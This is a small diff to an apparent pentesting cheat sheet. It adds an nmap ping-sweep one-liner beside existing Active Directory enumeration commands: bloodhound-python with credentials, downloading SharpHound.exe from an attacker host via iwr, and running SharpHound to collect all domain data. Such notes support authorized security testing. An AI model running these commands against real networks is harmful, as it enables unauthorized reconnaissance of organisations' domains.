@@ -8,3 +8,7 @@ bloodhound-python -d $domain -u user -p pass -ns $ip -c all
 iwr $ip/SharpHound.exe -o SharpHound.exe
 .\SharpHound.exe -c all --zipfilename shout
 ```
+
+```bash
+nmap $ip_range -sn  | grep for | cut -d" " -f5
+```
